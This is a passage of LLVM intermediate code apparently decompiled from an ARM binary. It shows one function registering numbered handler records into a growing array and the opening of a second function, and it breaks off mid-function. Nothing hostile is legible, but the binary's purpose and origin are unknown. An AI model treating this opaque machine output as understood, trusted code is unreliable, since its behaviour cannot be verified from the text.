  %v1_8684 = trunc i32 %v2_867c to i8
  %v2_8684 = load i32, i32* @r4, align 4
  %v3_8684 = inttoptr i32 %v2_8684 to i8*
  store i8 %v1_8684, i8* %v3_8684, align 1
  %v0_8688 = load i32, i32* %r2.global-to-local, align 4
  %v1_8688 = load i32, i32* @r6, align 4
  %v2_8688 = inttoptr i32 %v1_8688 to i32*
  store i32 %v0_8688, i32* %v2_8688, align 4
  %v2_868c = call i32 @function_1214c(i32 %v1_867c, i32 8)
  %v2_8690 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_8690 = zext i8 %v2_8690 to i32
  store i32 ptrtoint (i32* @global_var_c18c.29 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_868c, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86a0 = load i32, i32* @r8, align 4
  %v2_86a0 = add i32 %v1_86a0, %v3_8690
  store i32 %v2_86a0, i32* %r1.global-to-local, align 4
  %v2_86a4 = load i32, i32* @global_var_1e9c4.19, align 4
  %v2_86a8 = inttoptr i32 %v2_868c to i32*
  store i32 ptrtoint (i32* @global_var_c18c.29 to i32), i32* %v2_86a8, align 4
  %v3_86ac = load i32, i32* @r5, align 4
  %v4_86ac = add i32 %v3_86ac, 4
  %v5_86ac = inttoptr i32 %v4_86ac to i8*
  store i8 2, i8* %v5_86ac, align 1
  %v0_86b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86b0 = mul i32 %v0_86b0, 4
  store i32 %v3_86b0, i32* %r1.global-to-local, align 4
  %v5_86b4 = inttoptr i32 %v2_86a4 to i32*
  %v6_86b4 = call i32 @function_12280(i32* %v5_86b4, i32 %v3_86b0, i32 ptrtoint (i32* @global_var_c18c.29 to i32), i32 2)
  %v2_86b8 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_86b8 = zext i8 %v2_86b8 to i32
  store i32 %v3_86b8, i32* %r3.global-to-local, align 4
  store i32 %v6_86b4, i32* %r2.global-to-local, align 4
  %v0_86c0 = load i32, i32* @r5, align 4
  %v5_86c0 = mul nuw nsw i32 %v3_86b8, 4
  %v6_86c0 = add i32 %v5_86c0, %v6_86b4
  %v7_86c0 = inttoptr i32 %v6_86c0 to i32*
  store i32 %v0_86c0, i32* %v7_86c0, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r8, align 4
  %v2_86c8 = add i32 %v1_86c8, %v0_86c8
  store i32 %v2_86c8, i32* %r3.global-to-local, align 4
  %v1_86d0 = load i32, i32* @r6, align 4
  %v2_86d0 = inttoptr i32 %v1_86d0 to i32*
  store i32 %v6_86b4, i32* %v2_86d0, align 4
  %v0_86d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_86d4 = trunc i32 %v0_86d4 to i8
  %v2_86d4 = load i32, i32* @r4, align 4
  %v3_86d4 = inttoptr i32 %v2_86d4 to i8*
  store i8 %v1_86d4, i8* %v3_86d4, align 1
  %v2_86d8 = call i32 @function_1214c(i32 %v1_86c8, i32 8)
  %v2_86dc = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_86dc = zext i8 %v2_86dc to i32
  store i32 ptrtoint (i32* @global_var_b5c8.31 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_86d8, i32* @r5, align 4
  %v1_86ec = load i32, i32* @r8, align 4
  %v2_86ec = add i32 %v1_86ec, %v3_86dc
  store i32 %v2_86ec, i32* %r1.global-to-local, align 4
  %v2_86f0 = load i32, i32* @global_var_1e9c4.19, align 4
  %v2_86f4 = inttoptr i32 %v2_86d8 to i32*
  store i32 ptrtoint (i32* @global_var_b5c8.31 to i32), i32* %v2_86f4, align 4
  %v0_86f8 = load i32, i32* @r7, align 4
  %v1_86f8 = trunc i32 %v0_86f8 to i8
  %v2_86f8 = load i32, i32* @r5, align 4
  %v3_86f8 = add i32 %v2_86f8, 4
  %v4_86f8 = inttoptr i32 %v3_86f8 to i8*
  store i8 %v1_86f8, i8* %v4_86f8, align 1
  %v0_86fc = load i32, i32* %r1.global-to-local, align 4
  %v3_86fc = mul i32 %v0_86fc, 4
  store i32 %v3_86fc, i32* %r1.global-to-local, align 4
  %v4_8700 = inttoptr i32 %v2_86f0 to i32*
  %v5_8700 = call i32 @function_12280(i32* %v4_8700, i32 %v3_86fc, i32 %v6_86b4, i32 ptrtoint (i32* @global_var_b5c8.31 to i32))
  %v2_8704 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_8704 = zext i8 %v2_8704 to i32
  store i32 %v3_8704, i32* %r3.global-to-local, align 4
  store i32 %v5_8700, i32* %r2.global-to-local, align 4
  %v0_870c = load i32, i32* @r5, align 4
  %v5_870c = mul nuw nsw i32 %v3_8704, 4
  %v6_870c = add i32 %v5_870c, %v5_8700
  %v7_870c = inttoptr i32 %v6_870c to i32*
  store i32 %v0_870c, i32* %v7_870c, align 4
  %v0_8710 = load i32, i32* @r7, align 4
  store i32 %v0_8710, i32* %r1.global-to-local, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = load i32, i32* @r8, align 4
  %v2_8714 = add i32 %v1_8714, %v0_8714
  store i32 %v2_8714, i32* %r3.global-to-local, align 4
  %v1_871c = trunc i32 %v2_8714 to i8
  %v2_871c = load i32, i32* @r4, align 4
  %v3_871c = inttoptr i32 %v2_871c to i8*
  store i8 %v1_871c, i8* %v3_871c, align 1
  %v0_8720 = load i32, i32* %r2.global-to-local, align 4
  %v1_8720 = load i32, i32* @r6, align 4
  %v2_8720 = inttoptr i32 %v1_8720 to i32*
  store i32 %v0_8720, i32* %v2_8720, align 4
  %v2_8724 = call i32 @function_1214c(i32 %v1_8714, i32 %v0_8710)
  %v2_8728 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_8728 = zext i8 %v2_8728 to i32
  store i32 ptrtoint (i32* @global_var_af1c.33 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8724, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8738 = load i32, i32* @r8, align 4
  %v2_8738 = add i32 %v1_8738, %v3_8728
  store i32 %v2_8738, i32* %r1.global-to-local, align 4
  %v2_873c = load i32, i32* @global_var_1e9c4.19, align 4
  %v2_8740 = inttoptr i32 %v2_8724 to i32*
  store i32 ptrtoint (i32* @global_var_af1c.33 to i32), i32* %v2_8740, align 4
  %v3_8744 = load i32, i32* @r5, align 4
  %v4_8744 = add i32 %v3_8744, 4
  %v5_8744 = inttoptr i32 %v4_8744 to i8*
  store i8 3, i8* %v5_8744, align 1
  %v0_8748 = load i32, i32* %r1.global-to-local, align 4
  %v3_8748 = mul i32 %v0_8748, 4
  store i32 %v3_8748, i32* %r1.global-to-local, align 4
  %v5_874c = inttoptr i32 %v2_873c to i32*
  %v6_874c = call i32 @function_12280(i32* %v5_874c, i32 %v3_8748, i32 ptrtoint (i32* @global_var_af1c.33 to i32), i32 3)
  %v2_8750 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_8750 = zext i8 %v2_8750 to i32
  store i32 %v3_8750, i32* %r3.global-to-local, align 4
  store i32 %v6_874c, i32* %r2.global-to-local, align 4
  %v0_8758 = load i32, i32* @r5, align 4
  %v5_8758 = mul nuw nsw i32 %v3_8750, 4
  %v6_8758 = add i32 %v5_8758, %v6_874c
  %v7_8758 = inttoptr i32 %v6_8758 to i32*
  store i32 %v0_8758, i32* %v7_8758, align 4
  %v0_875c = load i32, i32* @r7, align 4
  store i32 %v0_875c, i32* %r1.global-to-local, align 4
  %v0_8760 = load i32, i32* %r3.global-to-local, align 4
  %v1_8760 = load i32, i32* @r8, align 4
  %v2_8760 = add i32 %v1_8760, %v0_8760
  store i32 %v2_8760, i32* %r3.global-to-local, align 4
  %v1_8768 = trunc i32 %v2_8760 to i8
  %v2_8768 = load i32, i32* @r4, align 4
  %v3_8768 = inttoptr i32 %v2_8768 to i8*
  store i8 %v1_8768, i8* %v3_8768, align 1
  %v0_876c = load i32, i32* %r2.global-to-local, align 4
  %v1_876c = load i32, i32* @r6, align 4
  %v2_876c = inttoptr i32 %v1_876c to i32*
  store i32 %v0_876c, i32* %v2_876c, align 4
  %v2_8770 = call i32 @function_1214c(i32 %v1_8760, i32 %v0_875c)
  %v2_8774 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_8774 = zext i8 %v2_8774 to i32
  store i32 ptrtoint (i32* @global_var_a824.35 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8770, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_8784 = load i32, i32* @r8, align 4
  %v2_8784 = add i32 %v1_8784, %v3_8774
  store i32 %v2_8784, i32* %r1.global-to-local, align 4
  %v2_8788 = load i32, i32* @global_var_1e9c4.19, align 4
  %v2_878c = inttoptr i32 %v2_8770 to i32*
  store i32 ptrtoint (i32* @global_var_a824.35 to i32), i32* %v2_878c, align 4
  %v3_8790 = load i32, i32* @r5, align 4
  %v4_8790 = add i32 %v3_8790, 4
  %v5_8790 = inttoptr i32 %v4_8790 to i8*
  store i8 4, i8* %v5_8790, align 1
  %v0_8794 = load i32, i32* %r1.global-to-local, align 4
  %v3_8794 = mul i32 %v0_8794, 4
  store i32 %v3_8794, i32* %r1.global-to-local, align 4
  %v5_8798 = inttoptr i32 %v2_8788 to i32*
  %v6_8798 = call i32 @function_12280(i32* %v5_8798, i32 %v3_8794, i32 ptrtoint (i32* @global_var_a824.35 to i32), i32 4)
  %v2_879c = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_879c = zext i8 %v2_879c to i32
  store i32 %v3_879c, i32* %r3.global-to-local, align 4
  store i32 %v6_8798, i32* %r2.global-to-local, align 4
  %v0_87a4 = load i32, i32* @r5, align 4
  %v5_87a4 = mul nuw nsw i32 %v3_879c, 4
  %v6_87a4 = add i32 %v5_87a4, %v6_8798
  %v7_87a4 = inttoptr i32 %v6_87a4 to i32*
  store i32 %v0_87a4, i32* %v7_87a4, align 4
  %v0_87a8 = load i32, i32* @r7, align 4
  store i32 %v0_87a8, i32* %r1.global-to-local, align 4
  %v0_87ac = load i32, i32* %r3.global-to-local, align 4
  %v1_87ac = load i32, i32* @r8, align 4
  %v2_87ac = add i32 %v1_87ac, %v0_87ac
  store i32 %v2_87ac, i32* %r3.global-to-local, align 4
  %v1_87b4 = trunc i32 %v2_87ac to i8
  %v2_87b4 = load i32, i32* @r4, align 4
  %v3_87b4 = inttoptr i32 %v2_87b4 to i8*
  store i8 %v1_87b4, i8* %v3_87b4, align 1
  %v0_87b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87b8 = load i32, i32* @r6, align 4
  %v2_87b8 = inttoptr i32 %v1_87b8 to i32*
  store i32 %v0_87b8, i32* %v2_87b8, align 4
  %v2_87bc = call i32 @function_1214c(i32 %v1_87ac, i32 %v0_87a8)
  %v2_87c0 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_87c0 = zext i8 %v2_87c0 to i32
  store i32 ptrtoint (i32* @global_var_a070.37 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87bc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_87d0 = load i32, i32* @r8, align 4
  %v2_87d0 = add i32 %v1_87d0, %v3_87c0
  store i32 %v2_87d0, i32* %r1.global-to-local, align 4
  %v2_87d4 = load i32, i32* @global_var_1e9c4.19, align 4
  %v2_87d8 = inttoptr i32 %v2_87bc to i32*
  store i32 ptrtoint (i32* @global_var_a070.37 to i32), i32* %v2_87d8, align 4
  %v3_87dc = load i32, i32* @r5, align 4
  %v4_87dc = add i32 %v3_87dc, 4
  %v5_87dc = inttoptr i32 %v4_87dc to i8*
  store i8 5, i8* %v5_87dc, align 1
  %v0_87e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_87e0 = mul i32 %v0_87e0, 4
  store i32 %v3_87e0, i32* %r1.global-to-local, align 4
  %v5_87e4 = inttoptr i32 %v2_87d4 to i32*
  %v6_87e4 = call i32 @function_12280(i32* %v5_87e4, i32 %v3_87e0, i32 ptrtoint (i32* @global_var_a070.37 to i32), i32 5)
  %v2_87e8 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_87e8 = zext i8 %v2_87e8 to i32
  store i32 %v3_87e8, i32* %r3.global-to-local, align 4
  store i32 %v6_87e4, i32* %r2.global-to-local, align 4
  %v0_87f0 = load i32, i32* @r5, align 4
  %v5_87f0 = mul nuw nsw i32 %v3_87e8, 4
  %v6_87f0 = add i32 %v5_87f0, %v6_87e4
  %v7_87f0 = inttoptr i32 %v6_87f0 to i32*
  store i32 %v0_87f0, i32* %v7_87f0, align 4
  %v0_87f4 = load i32, i32* @r7, align 4
  store i32 %v0_87f4, i32* %r1.global-to-local, align 4
  %v0_87f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r8, align 4
  %v2_87f8 = add i32 %v1_87f8, %v0_87f8
  store i32 %v2_87f8, i32* %r3.global-to-local, align 4
  %v1_8800 = trunc i32 %v2_87f8 to i8
  %v2_8800 = load i32, i32* @r4, align 4
  %v3_8800 = inttoptr i32 %v2_8800 to i8*
  store i8 %v1_8800, i8* %v3_8800, align 1
  %v0_8804 = load i32, i32* %r2.global-to-local, align 4
  %v1_8804 = load i32, i32* @r6, align 4
  %v2_8804 = inttoptr i32 %v1_8804 to i32*
  store i32 %v0_8804, i32* %v2_8804, align 4
  %v2_8808 = call i32 @function_1214c(i32 %v1_87f8, i32 %v0_87f4)
  %v2_880c = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_880c = zext i8 %v2_880c to i32
  store i32 39100, i32* %r2.global-to-local, align 4
  store i32 %v2_8808, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_881c = load i32, i32* @r8, align 4
  %v2_881c = add i32 %v1_881c, %v3_880c
  store i32 %v2_881c, i32* %r1.global-to-local, align 4
  %v2_8820 = load i32, i32* @global_var_1e9c4.19, align 4
  %v2_8824 = inttoptr i32 %v2_8808 to i32*
  store i32 39100, i32* %v2_8824, align 4
  %v3_8828 = load i32, i32* @r5, align 4
  %v4_8828 = add i32 %v3_8828, 4
  %v5_8828 = inttoptr i32 %v4_8828 to i8*
  store i8 10, i8* %v5_8828, align 1
  %v0_882c = load i32, i32* %r1.global-to-local, align 4
  %v3_882c = mul i32 %v0_882c, 4
  store i32 %v3_882c, i32* %r1.global-to-local, align 4
  %v5_8830 = inttoptr i32 %v2_8820 to i32*
  %v6_8830 = call i32 @function_12280(i32* %v5_8830, i32 %v3_882c, i32 39100, i32 10)
  %v2_8834 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_8834 = zext i8 %v2_8834 to i32
  store i32 %v3_8834, i32* %r3.global-to-local, align 4
  store i32 %v6_8830, i32* %r2.global-to-local, align 4
  %v0_883c = load i32, i32* @r5, align 4
  %v5_883c = mul nuw nsw i32 %v3_8834, 4
  %v6_883c = add i32 %v5_883c, %v6_8830
  %v7_883c = inttoptr i32 %v6_883c to i32*
  store i32 %v0_883c, i32* %v7_883c, align 4
  %v0_8840 = load i32, i32* @r7, align 4
  store i32 %v0_8840, i32* %r1.global-to-local, align 4
  %v0_8844 = load i32, i32* %r3.global-to-local, align 4
  %v1_8844 = load i32, i32* @r8, align 4
  %v2_8844 = add i32 %v1_8844, %v0_8844
  store i32 %v2_8844, i32* %r3.global-to-local, align 4
  %v1_884c = trunc i32 %v2_8844 to i8
  %v2_884c = load i32, i32* @r4, align 4
  %v3_884c = inttoptr i32 %v2_884c to i8*
  store i8 %v1_884c, i8* %v3_884c, align 1
  %v0_8850 = load i32, i32* %r2.global-to-local, align 4
  %v1_8850 = load i32, i32* @r6, align 4
  %v2_8850 = inttoptr i32 %v1_8850 to i32*
  store i32 %v0_8850, i32* %v2_8850, align 4
  %v2_8854 = call i32 @function_1214c(i32 %v1_8844, i32 %v0_8840)
  %v2_8858 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_8858 = zext i8 %v2_8858 to i32
  store i32 ptrtoint (i32* @global_var_9000.40 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8854, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_8868 = load i32, i32* @r8, align 4
  %v2_8868 = add i32 %v1_8868, %v3_8858
  store i32 %v2_8868, i32* %r1.global-to-local, align 4
  %v2_886c = load i32, i32* @global_var_1e9c4.19, align 4
  %v2_8870 = inttoptr i32 %v2_8854 to i32*
  store i32 ptrtoint (i32* @global_var_9000.40 to i32), i32* %v2_8870, align 4
  %v3_8874 = load i32, i32* @r5, align 4
  %v4_8874 = add i32 %v3_8874, 4
  %v5_8874 = inttoptr i32 %v4_8874 to i8*
  store i8 6, i8* %v5_8874, align 1
  %v0_8878 = load i32, i32* %r1.global-to-local, align 4
  %v3_8878 = mul i32 %v0_8878, 4
  store i32 %v3_8878, i32* %r1.global-to-local, align 4
  %v5_887c = inttoptr i32 %v2_886c to i32*
  %v6_887c = call i32 @function_12280(i32* %v5_887c, i32 %v3_8878, i32 ptrtoint (i32* @global_var_9000.40 to i32), i32 6)
  %v2_8880 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_8880 = zext i8 %v2_8880 to i32
  store i32 %v3_8880, i32* %r3.global-to-local, align 4
  store i32 %v6_887c, i32* %r2.global-to-local, align 4
  %v0_8888 = load i32, i32* @r5, align 4
  %v5_8888 = mul nuw nsw i32 %v3_8880, 4
  %v6_8888 = add i32 %v5_8888, %v6_887c
  %v7_8888 = inttoptr i32 %v6_8888 to i32*
  store i32 %v0_8888, i32* %v7_8888, align 4
  %v0_888c = load i32, i32* @r7, align 4
  store i32 %v0_888c, i32* %r1.global-to-local, align 4
  %v0_8890 = load i32, i32* %r3.global-to-local, align 4
  %v1_8890 = load i32, i32* @r8, align 4
  %v2_8890 = add i32 %v1_8890, %v0_8890
  store i32 %v2_8890, i32* %r3.global-to-local, align 4
  %v1_8898 = trunc i32 %v2_8890 to i8
  %v2_8898 = load i32, i32* @r4, align 4
  %v3_8898 = inttoptr i32 %v2_8898 to i8*
  store i8 %v1_8898, i8* %v3_8898, align 1
  %v0_889c = load i32, i32* %r2.global-to-local, align 4
  %v1_889c = load i32, i32* @r6, align 4
  %v2_889c = inttoptr i32 %v1_889c to i32*
  store i32 %v0_889c, i32* %v2_889c, align 4
  %v2_88a0 = call i32 @function_1214c(i32 %v1_8890, i32 %v0_888c)
  %v2_88a4 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_88a4 = zext i8 %v2_88a4 to i32
  store i32 ptrtoint (i32* @global_var_896c.42 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88a0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88b4 = load i32, i32* @r8, align 4
  %v2_88b4 = add i32 %v1_88b4, %v3_88a4
  store i32 %v2_88b4, i32* %r1.global-to-local, align 4
  %v2_88b8 = load i32, i32* @global_var_1e9c4.19, align 4
  %v2_88bc = inttoptr i32 %v2_88a0 to i32*
  store i32 ptrtoint (i32* @global_var_896c.42 to i32), i32* %v2_88bc, align 4
  %v3_88c0 = load i32, i32* @r5, align 4
  %v4_88c0 = add i32 %v3_88c0, 4
  %v5_88c0 = inttoptr i32 %v4_88c0 to i8*
  store i8 7, i8* %v5_88c0, align 1
  %v0_88c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_88c4 = mul i32 %v0_88c4, 4
  store i32 %v3_88c4, i32* %r1.global-to-local, align 4
  %v5_88c8 = inttoptr i32 %v2_88b8 to i32*
  %v6_88c8 = call i32 @function_12280(i32* %v5_88c8, i32 %v3_88c4, i32 ptrtoint (i32* @global_var_896c.42 to i32), i32 7)
  %v2_88cc = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_88cc = zext i8 %v2_88cc to i32
  store i32 %v3_88cc, i32* %r3.global-to-local, align 4
  store i32 %v6_88c8, i32* %r2.global-to-local, align 4
  %v0_88d4 = load i32, i32* @r5, align 4
  %v5_88d4 = mul nuw nsw i32 %v3_88cc, 4
  %v6_88d4 = add i32 %v5_88d4, %v6_88c8
  %v7_88d4 = inttoptr i32 %v6_88d4 to i32*
  store i32 %v0_88d4, i32* %v7_88d4, align 4
  %v0_88d8 = load i32, i32* @r7, align 4
  store i32 %v0_88d8, i32* %r1.global-to-local, align 4
  %v0_88dc = load i32, i32* %r3.global-to-local, align 4
  %v1_88dc = load i32, i32* @r8, align 4
  %v2_88dc = add i32 %v1_88dc, %v0_88dc
  store i32 %v2_88dc, i32* %r3.global-to-local, align 4
  %v1_88e4 = trunc i32 %v2_88dc to i8
  %v2_88e4 = load i32, i32* @r4, align 4
  %v3_88e4 = inttoptr i32 %v2_88e4 to i8*
  store i8 %v1_88e4, i8* %v3_88e4, align 1
  %v0_88e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_88e8 = load i32, i32* @r6, align 4
  %v2_88e8 = inttoptr i32 %v1_88e8 to i32*
  store i32 %v0_88e8, i32* %v2_88e8, align 4
  %v2_88ec = call i32 @function_1214c(i32 %v1_88dc, i32 %v0_88d8)
  %v2_88f0 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_88f0 = zext i8 %v2_88f0 to i32
  store i32 ptrtoint (i32* @global_var_961c.44 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88ec, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8900 = load i32, i32* @r8, align 4
  %v2_8900 = add i32 %v1_8900, %v3_88f0
  store i32 %v2_8900, i32* %r1.global-to-local, align 4
  %v2_8904 = load i32, i32* @global_var_1e9c4.19, align 4
  %v2_8908 = inttoptr i32 %v2_88ec to i32*
  store i32 ptrtoint (i32* @global_var_961c.44 to i32), i32* %v2_8908, align 4
  %v3_890c = load i32, i32* @r5, align 4
  %v4_890c = add i32 %v3_890c, 4
  %v5_890c = inttoptr i32 %v4_890c to i8*
  store i8 9, i8* %v5_890c, align 1
  %v0_8910 = load i32, i32* %r1.global-to-local, align 4
  %v3_8910 = mul i32 %v0_8910, 4
  store i32 %v3_8910, i32* %r1.global-to-local, align 4
  %v5_8914 = inttoptr i32 %v2_8904 to i32*
  %v6_8914 = call i32 @function_12280(i32* %v5_8914, i32 %v3_8910, i32 ptrtoint (i32* @global_var_961c.44 to i32), i32 9)
  %v2_8918 = load i8, i8* bitcast (i8** @global_var_1e9c0.17 to i8*), align 4
  %v3_8918 = zext i8 %v2_8918 to i32
  store i32 %v3_8918, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r6, align 4
  %v2_891c = inttoptr i32 %v1_891c to i32*
  store i32 %v6_8914, i32* %v2_891c, align 4
  %v0_8920 = load i32, i32* @r5, align 4
  %v2_8920 = load i32, i32* %r3.global-to-local, align 4
  %v5_8920 = mul i32 %v2_8920, 4
  %v6_8920 = add i32 %v5_8920, %v6_8914
  %v7_8920 = inttoptr i32 %v6_8920 to i32*
  store i32 %v0_8920, i32* %v7_8920, align 4
  %v0_8924 = load i32, i32* %r3.global-to-local, align 4
  %v1_8924 = load i32, i32* @r8, align 4
  %v2_8924 = add i32 %v1_8924, %v0_8924
  store i32 %v2_8924, i32* %r2.global-to-local, align 4
  %v1_892c = trunc i32 %v2_8924 to i8
  %v2_892c = load i32, i32* @r4, align 4
  %v3_892c = inttoptr i32 %v2_892c to i8*
  store i8 %v1_892c, i8* %v3_892c, align 1
  %v2_8930 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8930, i32* @r4, align 4
  store i32 %v6_85e0, i32* @r5, align 4
  store i32 %v9_85e0, i32* @r6, align 4
  store i32 %v12_85e0, i32* @r7, align 4
  store i32 %v15_85e0, i32* @r8, align 4
  ret i32 %v1_8924

; uselistorder directives
  uselistorder i32 %v1_8924, { 1, 0 }
  uselistorder i32 %v3_8910, { 1, 0 }
  uselistorder i32 %v1_88dc, { 1, 0 }
  uselistorder i32 %v3_88c4, { 1, 0 }
  uselistorder i32 %v1_8890, { 1, 0 }
  uselistorder i32 %v3_8878, { 1, 0 }
  uselistorder i32 %v1_8844, { 1, 0 }
  uselistorder i32 %v3_882c, { 1, 0 }
  uselistorder i32 %v1_87f8, { 1, 0 }
  uselistorder i32 %v3_87e0, { 1, 0 }
  uselistorder i32 %v1_87ac, { 1, 0 }
  uselistorder i32 %v3_8794, { 1, 0 }
  uselistorder i32 %v1_8760, { 1, 0 }
  uselistorder i32 %v3_8748, { 1, 0 }
  uselistorder i32 %v1_8714, { 1, 0 }
  uselistorder i32 %v3_86fc, { 1, 0 }
  uselistorder i32 %v1_86c8, { 1, 0 }
  uselistorder i32 %v6_86b4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86b0, { 1, 0 }
  uselistorder i32 %v1_867c, { 1, 0 }
  uselistorder i32 %v3_8664, { 1, 0 }
  uselistorder i32 %v2_8640, { 1, 0 }
  uselistorder i32 %v6_861c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8618, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 43, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i8* bitcast (i8** @global_var_1e9c0.17 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_1e9c1.25 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_1e9c4.19, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11 }
}

define i32 @function_896c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_896c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_896c = load i32, i32* @r4, align 4
  %v6_896c = load i32, i32* @r5, align 4
  %v24_896c = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_8988 = call i32 @function_1214c(i32 %arg1, i32 4)
  %v0_898c = load i32, i32* @r5, align 4
  store i32 %v0_898c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_899c = load i32, i32* @r4, align 4
  store i32 %v0_899c, i32* %r0.global-to-local, align 4
  %v5_89a0 = inttoptr i32 %v0_898c to i32*
  %v6_89a0 = call i32 @function_8570(i32 %v0_899c, i32* %v5_89a0, i32 2, i32 0, i32 %v2_8988)
  %v1_89ac = urem i32 %v6_89a0, 256
  store i32 %v1_89ac, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_89b8 = load i32, i32* @r5, align 4
  store i32 %v0_89b8, i32* %r1.global-to-local, align 4
  %v0_89bc = load i32, i32* @r4, align 4
  store i32 %v0_89bc, i32* %r0.global-to-local, align 4
  %v5_89c0 = trunc i32 %v6_89a0 to i8
  %v6_89c4 = inttoptr i32 %v0_89b8 to i32*
  %v7_89c4 = call i32 @function_8570(i32 %v0_89bc, i32* %v6_89c4, i32 3, i32 65535, i32 %v6_89a0)
  %v0_89c8 = load i32, i32* @r5, align 4
  store i32 %v0_89c8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_89c4, i32* %fp.global-to-local, align 4
  %v0_89d8 = load i32, i32* @r4, align 4
  store i32 %v0_89d8, i32* %r0.global-to-local, align 4
  %v5_89dc = inttoptr i32 %v0_89c8 to i32*
  %v6_89dc = call i32 @function_8570(i32 %v0_89d8, i32* %v5_89dc, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_89e4 = urem i32 %v6_89dc, 256
  store i32 %v1_89e4, i32* %ip.global-to-local, align 4
  %v0_89e8 = load i32, i32* @r5, align 4
  store i32 %v0_89e8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_89f4 = load i32, i32* @r4, align 4
  store i32 %v0_89f4, i32* %r0.global-to-local, align 4
